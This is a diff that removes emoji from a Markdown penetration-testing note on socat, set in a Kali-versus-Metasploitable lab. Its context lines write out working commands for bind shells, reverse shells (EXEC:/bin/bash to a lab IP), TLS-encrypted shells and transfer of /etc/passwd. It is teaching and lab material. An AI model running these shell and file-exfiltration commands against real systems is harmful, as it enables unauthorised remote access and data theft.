@@ -1,10 +1,10 @@
-## 🛠️ Socat
+##  Socat
 
 **Socat** (Socket CAT) is a powerful networking utility like Netcat, but with **more advanced features**, especially useful in penetration testing, remote shells, file transfers, and port forwarding.
 
 ---
 
-### ⚙️ Basic Concepts
+###  Basic Concepts
 
 - **socat** allows for two bidirectional byte streams to be connected.
     
@@ -15,16 +15,16 @@
 
 ---
 
-### 🔗 Basic Usage
+###  Basic Usage
 
-#### 📥 Listener (Metasploitable):
+####  Listener (Metasploitable):
 
 ```bash
 socat TCP4-LISTEN:4444 STDOUT
 # Equivalent to: nc -l -p 4444
 ```
 
-#### 📤 Sender (Kali):
+####  Sender (Kali):
 
 ```bash
 socat - TCP4:192.168.1.4:4444
@@ -35,7 +35,7 @@ socat - TCP4:192.168.1.4:4444
 
 ---
 
-### 🐱 Viewing Files & Sending Input
+###  Viewing Files & Sending Input
 
 To display and then send data from a file:
 
@@ -43,7 +43,7 @@ To display and then send data from a file:
 cat - passwords_meta
 ```
 
-➡️ This command waits for input after displaying file content.  
+This command waits for input after displaying file content.  
 It's useful in exploits where **the server might close the connection quickly**, so instead, we can:
 
 ```bash
@@ -54,7 +54,7 @@ This ensures the connection remains open while the payload executes.
 
 ---
 
-### 📂 File Transfer via Socat
+###  File Transfer via Socat
 
 #### Server (Metasploitable) sends `/etc/passwd`:
 
@@ -76,7 +76,7 @@ socat TCP4:192.168.1.4:4000 FILE:secrets.txt,create
 - `create`: Creates the file if it doesn't exist.
     
 
-> ✅ **Tip**: You can mix `socat` and `nc`. For example:
+>  **Tip**: You can mix `socat` and `nc`. For example:
 > 
 > - `socat` on the server side (keeps connection open)
 >     
@@ -87,9 +87,9 @@ socat TCP4:192.168.1.4:4000 FILE:secrets.txt,create
 
 ---
 
-## 🖥️ Remote Shells with Socat
+##  Remote Shells with Socat
 
-### 🔗 Bind Shell
+###  Bind Shell
 
 #### Victim (Metasploitable):
 
@@ -110,7 +110,7 @@ socat -d -d -d - TCP4:192.168.1.4:4444
 
 ---
 
-### 🔁 Reverse Shell
+###  Reverse Shell
 
 #### Listener (Kali):
 
@@ -124,36 +124,36 @@ socat -d -d TCP4-LISTEN:4444 STDOUT
 socat TCP4:192.168.1.5:4444,fork EXEC:/bin/bash
 ```
 
-> 🔁 Reverse shells are useful when **firewalls block incoming connections** but allow **outgoing connections**.
+>  Reverse shells are useful when **firewalls block incoming connections** but allow **outgoing connections**.
 
 ---
 
-## 🔐 Encrypted Shells (SSL/TLS)
+##  Encrypted Shells (SSL/TLS)
 
-### 1️⃣ Create a Self-Signed Certificate
+###  Create a Self-Signed Certificate
 
 ```bash
 openssl req -x509 -newkey rsa:4096 -nodes -keyout key.pem -out cert.pem -days 365
 cat cert.pem key.pem > bind_shell.pem
 ```
 
-### 2️⃣ Bind Encrypted Shell (on Victim)
+###  Bind Encrypted Shell (on Victim)
 
 ```bash
 sudo socat OPENSSL-LISTEN:4444,cert=bind_shell.pem,verify=0 EXEC:/bin/bash
 ```
 
-### 3️⃣ Connect Securely (on Kali)
+### Connect Securely (on Kali)
 
 ```bash
 socat - OPENSSL:192.168.1.4:4444,verify=0
 ```
 
-> 🔐 This allows encrypted reverse/bind shells using TLS.
+>  This allows encrypted reverse/bind shells using TLS.
 
 ---
 
-### 🧪 Packet Inspection with Wireshark
+###  Packet Inspection with Wireshark
 
 Try sniffing both encrypted and unencrypted traffic:
 
@@ -166,11 +166,11 @@ Try sniffing both encrypted and unencrypted traffic:
 - Then, try an **encrypted** shell using `OPENSSL` → the data will be unreadable.
     
 
-> 🧠 Use this to **verify encryption** and **practice network forensics**.
+>  Use this to **verify encryption** and **practice network forensics**.
 
 ---
 
-## ✅ Quick Reference
+##  Quick Reference
 
 ```bash
 # Basic bind shell:
